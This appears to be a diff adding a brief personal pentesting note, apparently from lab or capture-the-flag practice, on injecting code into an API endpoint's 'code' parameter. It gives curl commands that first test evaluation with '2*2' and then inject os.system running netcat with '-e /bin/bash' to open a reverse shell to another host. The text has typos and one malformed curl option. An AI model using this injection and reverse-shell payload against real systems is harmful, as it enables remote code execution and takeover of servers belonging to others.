@@ -1,0 +1,12 @@
+if you get an api end point like
+
+page said {'code'}  --- so we  need to add coe
+
+then we need to inject code in it
+
+try with numbers if letters give 500 eror
+
+```
+curl -X POST http://192.168.250.117:50000/verify — data “code=2*2”
+curl http://192.168.197.117:50000/verify -d "code=os.system('nc 192.168.45.156 80 -e /bin/bash')"
+```
